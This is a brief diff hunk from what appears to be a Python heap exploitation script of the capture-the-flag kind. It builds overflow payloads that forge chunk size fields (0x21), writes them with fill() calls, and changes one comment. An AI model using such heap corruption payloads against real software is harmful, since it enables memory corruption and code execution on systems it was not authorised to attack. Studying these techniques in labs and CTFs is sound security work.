@@ -66,7 +66,7 @@ free(2)
 payload = b"a" * 16 + p64(0) + p64(0x21) + b"b" * 16 + p64(0) + p64(0x21) + p8(0x80)
 fill(0, payload)
 
-# change chunk size->0x21
+# change chunk 4 size->0x21
 payload = b"c" * 16 + p64(0) + p64(0x21)
 fill(3, payload)
 
